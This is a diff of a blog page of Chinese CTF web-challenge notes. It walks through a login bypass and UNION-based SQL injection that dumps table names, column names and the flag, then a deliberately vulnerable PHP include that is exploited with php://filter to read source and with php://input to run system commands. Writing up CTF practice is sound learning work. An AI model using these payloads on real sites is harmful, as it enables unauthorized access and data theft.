@@ -30,63 +30,52 @@
         <h1>web</h1>
         <div class="post-meta">
           <span>📁 CTF 刷题</span>
-          <span>📄 41 行</span>
+          <span>📄 48 行</span>
         </div>
       </header>
       <div class="post-content">
         <h1>web</h1>
+<h2>1. SQL 注入</h2>
+<p><strong>步骤</strong>：</p>
 <ol>
-<li>SQL注入</li>
+<li>登录框：弱口令 or 万能密码</li>
+<li>用常见字典爆一下（题目大概不会考字典容量）</li>
+<li>测试万能密码：<code>admin' or 1=1#</code>，直接就进去了</li>
+<li>找到注入点，走流程：</li>
 </ol>
-<p>1、登录框：弱口令or万能密码
-    2、用常见字典爆一下，爆不出来就算了，毕竟题目大概不会考字典容量
-    3、测试万能密码  admin' or 1=1#，直接就进去了，有点丝滑，居然没有换个')、")、--+、-- -、;%00
-    4、找到注入点了直接走流程
-    admin' or '1'='1' order by 1#
-    ……
-    admin' or '1'='1' order by 3#（三个字段）
-    admin' or '1'='1' union select 1,2,3#
-    admin' or '1'='1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();#
-    得到表名 flag,user
-    admin' or '1'='1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#
-    得到列名flag
-    admin' or '1'='1' union select 1,group_concat(flag),3 from flag#
-    get!</p>
+<pre><code class="language-sql">admin' or '1'='1' order by 1#
+admin' or '1'='1' order by 2#
+admin' or '1'='1' order by 3#   -- 三个字段
+admin' or '1'='1' union select 1,2,3#
+admin' or '1'='1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();#
+-- 得到表名: flag, user
+admin' or '1'='1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#
+-- 得到列名: flag
+admin' or '1'='1' union select 1,group_concat(flag),3 from flag#
+-- get!</code></pre>
+<hr>
+<h2>2. PHP 伪协议</h2>
+<pre><code class="language-php">&lt;?php include($_GET['url']);?&gt;</code></pre>
+<p>在网址后面加 <code>?url=xxx</code>，xxx 会被传递给 <code>include()</code>。</p>
+<h3>php://input</h3>
+<p>读取 HTTP 请求的原始 body（请求体），当作文件内容返回。如果 body 里有 PHP 代码，就会直接执行。</p>
+<p>需要 <strong>POST</strong> 方式发请求，请求体写上代码。</p>
+<h3>php://filter</h3>
+<p>对文件内容做"过滤"（例如 base64 编码），用来读取任意文件源码。不需要 POST，<strong>直接 GET</strong> 就行。</p>
+<pre><code>?url=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
+<p>会把 <code>flag.php</code> 的内容转成 base64 输出，解码就看到源码了。</p>
+<h3>完整攻击示例</h3>
+<p>一个完整的 HTTP POST 请求由三部分组成：</p>
 <ol>
-<li>``<code>php
-   &lt;?php include($_GET['url']);?&gt;
-</code>``</li>
+<li><strong>请求行</strong>：<code>POST /?url=php://input HTTP/1.1</code></li>
+<li><strong>请求头部</strong>：Host、Content-Type、Content-Length 等，一个空行分隔</li>
+<li><strong>请求体</strong>：我们写的 PHP 代码</li>
 </ol>
-<p>在网址后面加 ?url=xxx，xxx 会被传递给 include()</p>
-<h4><strong>php伪协议</strong></h4>
-<p>PHP 支持一些特殊的“协议”<sup class="footnote-ref"><a href="#fn- http://、file:// 等" id="fnref- http://、file:// 等">[ http://、file:// 等]</a></sup></p>
-<ul>
-<li>php://input</li>
-</ul>
-<p>读取 HTTP 请求的 <strong>原始 body（请求体）</strong>，并当作文件内容返回。</p>
-<p>如果用在 include 里，body 里有 PHP 代码，就会直接执行。</p>
-<p>需要 <strong>POST</strong> 方式发请求，并且请求体写上代码。</p>
-<ul>
-<li>php://filter</li>
-</ul>
-<p>对文件内容做<strong>“过滤”</strong><sup class="footnote-ref"><a href="#fn-例如 base64 编码" id="fnref-例如 base64 编码">[例如 base64 编码]</a></sup>用来 读取<strong>任意</strong>文件源码。</p>
-<p>不需要 POST，<strong>直接 GET</strong> 就行。</p>
-<p>示例：?url=php://filter/read=convert.base64-encode/resource=flag.php
-     会把 flag.php 的内容转成 base64 输出，我们解码就看到源码了。</p>
-<p><strong>一个完整的 HTTP POST 请求</strong>由三部分组成：</p>
-<ol>
-<li>请求行：POST /?url=php://input HTTP/1.1</li>
-<li>请求头部：Host: xxx，Content-Type: ...，Content-Length: ... 等</li>
-</ol>
-<p>​       一个空行（分隔头部和 body）</p>
-<ol>
-<li>请求体：我们写的 PHP 代码</li>
-</ol>
-<p>第一次发送-侦查</p>
-<p><?php system('ls -la');?></p>
-<p>第二次发送-读取</p>
-<p><?php system('cat "ctf_go_go_go index.php"');?></p>
-<p>或者用 cat ctf*</p>
+<p><strong>第一次发送 — 侦查</strong>：</p>
+<pre><code class="language-php">&lt;?php system('ls -la');?&gt;</code></pre>
+<p><strong>第二次发送 — 读取</strong>：</p>
+<pre><code class="language-php">&lt;?php system('cat &quot;ctf_go_go_go index.php&quot;');?&gt;</code></pre>
+<p>或者用通配符：<code>&lt;?php system('cat ctf*');?&gt;</code></p>
 
       </div>
     </article>
